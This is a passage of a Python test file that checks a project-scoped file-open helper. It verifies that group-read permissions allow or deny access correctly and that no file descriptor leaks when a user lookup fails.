        """Allows access when user is in the file's group and group-read is set."""
        helper, user_home, _, _, _ = helper_with_mounts
        test_file = os.path.join(user_home, "group_readable.txt")
        with open(test_file, "w") as f:
            f.write("group data")
        # Owner-only write, group-read, no other
        os.chmod(test_file, 0o640)

        file_stat = os.stat(test_file)

        with (
            mock.patch("ideasdk.filesystem.filesystem_helper.getpwnam") as mock_pwnam,
            mock.patch("os.getgrouplist") as mock_groups,
        ):
            # User is NOT the owner but IS in the file's group
            mock_pwnam.return_value = mock.Mock(pw_uid=99999, pw_gid=file_stat.st_gid)
            mock_groups.return_value = [file_stat.st_gid]
            result = helper.safe_open_with_project_scope(test_file, "rb")
            content = result.read()
            result.close()
        assert content == b"group data"

    def test_rejects_group_without_group_read_bit(self, helper_with_mounts):
        """Rejects when user is in the file's group but group-read is not set."""
        helper, user_home, _, _, _ = helper_with_mounts
        test_file = os.path.join(user_home, "no_group_read.txt")
        with open(test_file, "w") as f:
            f.write("secret")
        # Owner read/write only, no group or other read
        os.chmod(test_file, 0o600)

        file_stat = os.stat(test_file)

        with (
            mock.patch("ideasdk.filesystem.filesystem_helper.getpwnam") as mock_pwnam,
            mock.patch("os.getgrouplist") as mock_groups,
        ):
            # User is NOT the owner but IS in the file's group — group-read not set
            mock_pwnam.return_value = mock.Mock(pw_uid=99999, pw_gid=file_stat.st_gid)
            mock_groups.return_value = [file_stat.st_gid]
            with pytest.raises(exceptions.SocaException) as exc_info:
                helper.safe_open_with_project_scope(test_file, "rb")
            assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_fd_not_leaked_when_getpwnam_raises(self, helper_with_mounts):
        """Verifies the file descriptor is closed when getpwnam raises KeyError."""
        helper, user_home, _, _, _ = helper_with_mounts
        test_file = os.path.join(user_home, "leaktest.txt")
        with open(test_file, "w") as f:
            f.write("data")
        os.chmod(test_file, 0o644)

        fds_before = (
            len(os.listdir(f"/proc/{os.getpid()}/fd"))
            if os.path.exists("/proc/self/fd")
            else None
        )

        with mock.patch("ideasdk.filesystem.filesystem_helper.getpwnam") as mock_pwnam:
            mock_pwnam.side_effect = KeyError("getpwnam(): name not found: 'testuser'")
            with pytest.raises(KeyError):
                helper.safe_open_with_project_scope(test_file, "rb")

        # If /proc is available, verify no fd leak
        if fds_before is not None:
            fds_after = len(os.listdir(f"/proc/{os.getpid()}/fd"))
            assert (
                fds_after <= fds_before
            ), "File descriptor leaked after getpwnam failure"
